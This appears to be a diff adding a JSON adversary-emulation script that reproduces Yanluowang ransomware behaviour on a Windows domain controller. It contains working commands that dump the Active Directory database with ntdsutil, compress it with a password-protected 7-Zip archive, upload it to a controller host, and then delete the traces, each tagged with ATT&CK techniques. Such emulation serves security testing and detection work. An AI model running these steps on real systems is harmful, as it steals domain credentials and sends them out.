@@ -1,0 +1,200 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Emulating Yanluowang use of ntdsutil.exe",
+        "display_name": "Yanluowang_ntdsutil",
+        "name": "Yanluowang_ntdsutil",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 192.168.134.150:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "4": {
+                "name": "OVERVIEW",
+                "type": "assign",
+                "value": "This emulation is designed to emulate the behavior observed with Yanlouwang ransomware utilizing ntdsutil. This emulation must be run in privileged mode on a machine where ntdsutil.exe is present (usually a domain controller)."
+            },
+            "5": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "6": {
+                "name": "ECHO",
+                "type": "assign",
+                "value": "If the controller is not running in high integrity mode (see last command) the emulation will terminate."
+            },
+            "7": {
+                "function": "ifelse",
+                "next": "25",
+                "step": "5",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir C:\\windows\\system32\\ntdsutil.exe",
+                "rtags": [
+                    "att&ck-technique:T1003.003"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "function": "ifelse",
+                "next": "25",
+                "step": "8",
+                "type": "decision",
+                "value": "Incorrect function",
+                "verb": "contains"
+            },
+            "10": {
+                "name": "ECHO",
+                "type": "assign",
+                "value": "ntdsutil.exe not found on the target, terminating the emulation."
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c dir /s c:\\users\\public\\z",
+                "rtags": [
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir C:\\users\\public\\z",
+                "rtags": [
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell ntdsutil.exe 'ac i NTDS' 'ifm' 'create full c:\\users\\public\\z' q q",
+                "rtags": [
+                    "att&ck-technique:T1003.003",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS://shared/threats/common_x64/7za.exe --dest C:\\users\\public\\7za.exe --overwrite",
+                "rtags": [
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "c:\\users\\public\\7za.exe a -palfalfarulz C:\\users\\public\\z.7z C:\\users\\public\\z",
+                "rtags": [
+                    "att&ck-technique:T1560"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath C:\\users\\public\\z.7z",
+                "rtags": [
+                    "att&ck-technique:T1011"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "name": "ECHO",
+                "type": "assign",
+                "value": "Begin cleanup"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del C:\\users\\public\\7za.exe",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del C:\\users\\public\\z.7z",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /q /s C:\\users\\public\\z\\registry",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /q /s \"C:\\users\\public\\z\\Active Directory\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "function": "ifelse",
+                "next": "25",
+                "step": "11",
+                "type": "decision",
+                "value": "Incorrect function",
+                "verb": "does not contain"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "rmdir /s /q c:\\users\\public\\z",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "name": "ECHO",
+                "type": "assign",
+                "value": "Removing the staging directory since we created it."
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
